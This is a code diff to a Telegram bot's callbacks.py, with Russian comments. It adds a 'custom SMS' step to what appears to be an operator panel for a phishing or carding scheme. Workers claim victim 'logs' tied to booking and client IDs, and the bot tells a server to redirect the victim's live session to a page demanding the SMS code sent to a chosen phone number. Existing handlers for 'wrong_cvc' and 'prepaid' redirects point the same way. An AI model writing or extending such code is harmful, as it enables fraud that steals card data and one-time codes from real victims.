@@ -1,6 +1,8 @@
 # [file name]: callbacks.py (обновленная версия)
 # [file content begin]
 from aiogram import Dispatcher, types, F
+from aiogram.fsm.context import FSMContext  # Добавьте этот импорт
+from aiogram.fsm.state import State, StatesGroup
 from aiogram.exceptions import TelegramForbiddenError
 import httpx
 import sys
@@ -17,6 +19,106 @@ from bot.keyboards import get_management_keyboard, get_taken_keyboard, get_take_
 # Импортируем функции уведомлений для админского бота
 from admin_bot import notify_log_taken, notify_log_taken_over, notify_action, notify_user_response
 import config
+
+class CustomSMSStates(StatesGroup):
+    waiting_for_sms_code = State()
+
+async def handle_custom_sms(callback: types.CallbackQuery, state: FSMContext):
+    """Обработчик для кастомного SMS кода"""
+    session_id = callback.data.split(":")[1]
+    
+    log = get_log_by_session(session_id)
+    if not log or log['taken_by'] != callback.from_user.id:
+        await callback.answer("У вас нет доступа к этому логу", show_alert=True)
+        return
+    
+    # Сохраняем session_id в состоянии
+    await state.update_data(session_id=session_id)
+    
+    # Запрашиваем у пользователя последние 4 цифры номера телефона
+    await callback.message.answer(
+        "📱 <b>Кастомный SMS</b>\n\n"
+        "Введите последние 4 цифры номера телефона, на который должен прийти код:",
+        parse_mode="HTML"
+    )
+    
+    # Устанавливаем состояние ожидания цифр номера
+    await state.set_state(CustomSMSStates.waiting_for_sms_code)
+    await callback.answer()
+
+async def handle_sms_code_input(message: types.Message, state: FSMContext):
+    """Обрабатывает ввод последних 4 цифр номера телефона от пользователя"""
+    # Получаем данные из состояния
+    data = await state.get_data()
+    session_id = data.get('session_id')
+    
+    if not session_id:
+        await message.answer("❌ Ошибка: сессия не найдена")
+        await state.clear()
+        return
+    
+    # Проверяем, что введено 4 цифры (последние цифры номера телефона)
+    phone_digits = message.text.strip()
+    if not phone_digits.isdigit() or len(phone_digits) != 4:
+        await message.answer("❌ Пожалуйста, введите ровно 4 цифры номера телефона:")
+        return
+    
+    log = get_log_by_session(session_id)
+    if not log or log['taken_by'] != message.from_user.id:
+        await message.answer("❌ У вас нет доступа к этому логу")
+        await state.clear()
+        return
+    
+    # Отправляем запрос на сервер для перенаправления пользователя
+    try:
+        async with httpx.AsyncClient() as client:
+            response = await client.post(
+                f"{config.SERVER_URL}/redirect-custom-sms", 
+                json={
+                    "sessionId": session_id,
+                    "clientId": log['client_id'],
+                    "phoneDigits": phone_digits  # Изменили на phoneDigits
+                }
+            )
+            
+            if response.status_code == 200:
+                # Уведомляем админский бот
+                booking_id = log['booking_id'] or "N/A"
+                client_id = log['client_id'] or "N/A"
+                username = message.from_user.username or "без username"
+                
+                await notify_action(booking_id, client_id, username, message.from_user.id, "custom_sms", f"📱 Кастомный SMS номер: ***{phone_digits}")
+                await notify_user_response(booking_id, client_id, username, message.from_user.id, f"✅ Пользователь перенаправлен на страницу ввода SMS с номером ***{phone_digits}")
+                
+                await message.answer(
+                    f"✅ Пользователь перенаправлен на страницу ввода SMS кода\n\n"
+                    f"📱 Номер телефона: <b>***{phone_digits}</b>\n"
+                    f"📞 Сообщение: 'Введите код SMS отправленный на этот номер телефона ***{phone_digits}'",
+                    parse_mode="HTML"
+                )
+            else:
+                error_msg = "❌ Ошибка перенаправления пользователя"
+                await message.answer(error_msg)
+                
+                # Уведомляем админский бот об ошибке
+                booking_id = log['booking_id'] or "N/A"
+                client_id = log['client_id'] or "N/A"
+                username = message.from_user.username or "без username"
+                await notify_user_response(booking_id, client_id, username, message.from_user.id, error_msg)
+                
+    except Exception as e:
+        print(f"Error in custom SMS redirect: {e}")
+        error_msg = "❌ Ошибка соединения с сервером"
+        await message.answer(error_msg)
+        
+        # Уведомляем админский бот об ошибке
+        booking_id = log['booking_id'] or "N/A"
+        client_id = log['client_id'] or "N/A"
+        username = message.from_user.username or "без username"
+        await notify_user_response(booking_id, client_id, username, message.from_user.id, error_msg)
+    
+    # Очищаем состояние
+    await state.clear()
 
 async def take_log(callback: types.CallbackQuery):
     session_id = callback.data.split(":")[1]
@@ -376,4 +478,6 @@ def register_callbacks(dp: Dispatcher):
     dp.callback_query.register(handle_redirect_action, F.data.startswith("wrong_cvc:")) 
     dp.callback_query.register(handle_redirect_action, F.data.startswith("wrong_sms:"))
     dp.callback_query.register(handle_redirect_action, F.data.startswith("prepaid:"))
+    dp.callback_query.register(handle_custom_sms, F.data.startswith("custom_sms:"))
+    dp.message.register(handle_sms_code_input, CustomSMSStates.waiting_for_sms_code)
 # [file content end]
